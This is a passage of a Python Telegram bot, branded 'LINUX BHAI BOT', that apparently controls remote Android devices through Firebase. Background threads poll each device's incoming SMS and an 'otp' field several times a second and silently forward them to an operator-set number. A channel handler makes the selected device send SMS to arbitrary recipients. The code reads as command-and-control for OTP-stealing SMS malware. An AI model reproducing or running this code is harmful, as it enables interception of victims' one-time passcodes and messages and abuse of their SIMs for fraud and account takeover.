        return ConversationHandler.END
    
    user_id = str(update.effective_user.id)
    number = update.message.text.strip()
    
    if not re.match(r"^\+?[0-9]{10,15}$", number):
        await update.message.reply_text("<b>❌ Invalid number. Try again.</b>", parse_mode='HTML')
        return WAITING_OTP_NUMBER
    
    set_otp_number(user_id, number)
    await update.message.reply_text(f"<b>✅ Forward number set to <code>{number}</code>.</b>", parse_mode='HTML')
    return ConversationHandler.END

async def otp_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    await update.message.reply_text("<b>❌ Cancelled.</b>", parse_mode='HTML')
    return ConversationHandler.END

# ============================
# CHANNEL MESSAGE HANDLER
# ============================
def get_user_by_channel(channel_id):
    for uid, cfg in user_configs.items():
        if cfg.get("channel_id") == channel_id:
            return uid
    return None

async def handle_channel_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.channel_post:
        return
    
    channel_id = update.channel_post.chat_id
    user_id = get_user_by_channel(channel_id)
    
    if not user_id:
        logger.info(f"⚠️ No user for channel {channel_id}")
        return
    
    text = update.channel_post.text
    if not text:
        return
    
    logger.info(f"📩 Channel SMS received")
    
    selected = get_selected(user_id)
    if not selected or not selected.get("deviceId"):
        logger.warning(f"⚠️ No active device for {user_id}")
        return
    
    device_id = selected["deviceId"]
    from_number = selected.get("simPhoneNumber", "Unknown")
    
    to_match = re.search(r"(?:📞\s*)?To:\s*([+\d]+)", text, re.IGNORECASE)
    if not to_match:
        logger.warning(f"⚠️ No 'To:' found in message")
        return
    
    to_number = to_match.group(1).strip()
    logger.info(f"📞 To: {to_number}")
    
    msg_match = re.search(r"(?:💬\s*)?Message:\s*(.+)", text, re.DOTALL | re.IGNORECASE)
    
    if msg_match:
        message = msg_match.group(1).strip()
        logger.info(f"💬 Message: {message[:50]}...")
        
        send_outgoing_sms(user_id, device_id, to_number, message, from_number)
        logger.info(f"✅ SMS forwarded: {to_number}")
        
        try:
            await context.bot.send_message(
                chat_id=int(user_id),
                text=f"✅ <b>SMS Forwarded</b>\n\n"
                     f"📞 To: <code>{to_number}</code>\n"
                     f"💬 Message: <code>{message[:100]}...</code>",
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"Confirmation failed: {e}")
    
    else:
        logger.warning(f"⚠️ No 'Message:' found, sending raw text")
        send_outgoing_sms(user_id, device_id, to_number, text, from_number)

# ============================
# BACKGROUND THREADS
# ============================
def poll_otp_updates():
    while True:
        try:
            for user_id in list(user_configs.keys()):
                otp_number = get_otp_number(user_id)
                if not otp_number:
                    continue
                
                selected = get_selected(user_id)
                if not selected or not selected.get("deviceId"):
                    continue
                
                otp_data = firebase_get(user_id, "otp")
                if otp_data is None:
                    continue
                
                current_otp = str(otp_data).strip()
                if user_id not in last_otp or last_otp[user_id] != current_otp:
                    last_otp[user_id] = current_otp
                    
                    device_id = selected["deviceId"]
                    from_number = selected.get("simPhoneNumber", "Unknown")
                    send_outgoing_sms(user_id, device_id, otp_number, current_otp, from_number)
                    logger.info(f"✅ OTP sent: {current_otp}")
                    
        except Exception as e:
            logger.error(f"OTP polling error: {e}")
        time.sleep(0.3)

def poll_incoming_messages():
    while True:
        try:
            start_time = time.time()
            batch_data = {}
            
            for user_id, cfg in user_configs.items():
                forward_number = cfg.get("otpNumber")
                if not forward_number:
                    continue
                
                selected = cfg.get("selectedDevice", {})
                device_id = selected.get("deviceId")
                if not device_id:
                    continue
                
                device_msgs = firebase_get(user_id, f"messages/{device_id}")
                if not device_msgs or not isinstance(device_msgs, dict):
                    continue
                
                if device_id in processed_cache:
                    processed_set = processed_cache[device_id]
                else:
                    processed_keys = cfg.get("processed_keys", [])
                    processed_set = set(processed_keys)
                    processed_cache[device_id] = processed_set
                
                new_messages = []
                new_keys = []
                
                for msg_key, msg_data in device_msgs.items():
                    if not isinstance(msg_data, dict):
                        continue
                    
                    if msg_data.get("type") != "incoming":
                        continue
                    
                    if msg_key not in processed_set:
                        msg_text = msg_data.get("message", "")
                        if msg_text and len(msg_text) > 3:
                            new_messages.append((forward_number, msg_text))
                            new_keys.append(msg_key)
                
                if new_messages:
                    batch_data[user_id] = {
                        "device_id": device_id,
                        "from_number": selected.get("simPhoneNumber", "Unknown"),
                        "messages": new_messages,
                        "keys": new_keys,
                        "count": len(new_messages)
                    }
            
            if batch_data:
                for user_id, data in batch_data.items():
                    def process_user(user_id, data):
                        device_id = data["device_id"]
                        from_number = data["from_number"]
                        messages = data["messages"]
                        
                        def send_single(msg_data):
                            to_number, msg_text = msg_data
                            send_outgoing_sms(user_id, device_id, to_number, msg_text, from_number)
                        
                        futures = [executor.submit(send_single, msg) for msg in messages]
                        for future in as_completed(futures):
                            try:
                                future.result(timeout=3)
                            except Exception as e:
                                logger.error(f"SMS error: {e}")
                        
                        cfg = user_configs.get(user_id)
                        if cfg:
                            if device_id in processed_cache:
                                processed_cache[device_id].update(data["keys"])
                            else:
                                processed_cache[device_id] = set(data["keys"])
                            
                            cfg["processed_keys"] = list(processed_cache[device_id])
                            save_user_configs()
                            save_processed_cache()
                    
                    executor.submit(process_user, user_id, data)
                
                logger.info(f"✅ Batch processed in {time.time() - start_time:.3f}s")
            
            time.sleep(0.1)
            
        except Exception as e:
            logger.error(f"Incoming forward error: {e}")
            time.sleep(0.5)

# ============================
# MAIN
# ============================
def main():
    # Start Flask
    threading.Thread(target=run_flask, daemon=True).start()
    
    # Create bot app
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Start background threads
    threading.Thread(target=poll_otp_updates, daemon=True).start()
    threading.Thread(target=poll_incoming_messages, daemon=True).start()
    
    # Setup conversation
    setup_conv = ConversationHandler(
        entry_points=[CommandHandler("setup", setup_start)],
        states={
            URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_url)],
            CHANNEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_channel)]
        },
        fallbacks=[CommandHandler("cancel", setup_cancel)],
    )
    app.add_handler(setup_conv)
    
    # OTP conversation
    otp_conv = ConversationHandler(
        entry_points=[CommandHandler("setotp", setotp_command)],
        states={
            WAITING_OTP_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, otp_number_input)]
        },
        fallbacks=[CommandHandler("cancel", otp_cancel)],
    )
    app.add_handler(otp_conv)
    
    # Callback handlers
    app.add_handler(CallbackQueryHandler(device_callback, pattern="^dev_"))
    app.add_handler(CallbackQueryHandler(sim_callback, pattern="^sim_"))
    app.add_handler(CallbackQueryHandler(check_membership_callback, pattern="^check_membership$"))
    app.add_handler(CallbackQueryHandler(device_callback, pattern="^refresh_devices$"))
    app.add_handler(CallbackQueryHandler(quick_action_callback, pattern="^quick_"))
    
    # Command handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("devices", devices_command))
    app.add_handler(CommandHandler("resetforward", reset_forward))
    
    # SIM Management Commands
    app.add_handler(CommandHandler("addsim", add_sim_command))
    app.add_handler(CommandHandler("updatesim", updatesim_command))
    app.add_handler(CommandHandler("removesim", remove_sim_command))
    app.add_handler(CommandHandler("showdevice", show_device_command))
    app.add_handler(CommandHandler("listdevices", list_devices_command))
    
    # Channel handler
    app.add_handler(MessageHandler(filters.TEXT & filters.ChatType.CHANNEL, handle_channel_message))
    
    logger.info("🚀🚀🚀 LINUX BHAI BOT STARTED! 🚀🚀🚀")
    logger.info("📱 Channel SMS → Outgoing SMS (One-tap copy IGNORED)")
    logger.info("🔍 Ultimate SIM Detection (13+ Methods)")
    logger.info("⚡ Super Fast Polling (0.1s)")
    logger.info("💪 Thread Pool: 20 Workers")
    logger.info("📱 SIM Management Commands Added!")
    logger.info("📢 Channel: @LINUXBHAI001")
    logger.info("✅ 100% Perfect Code")
    
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()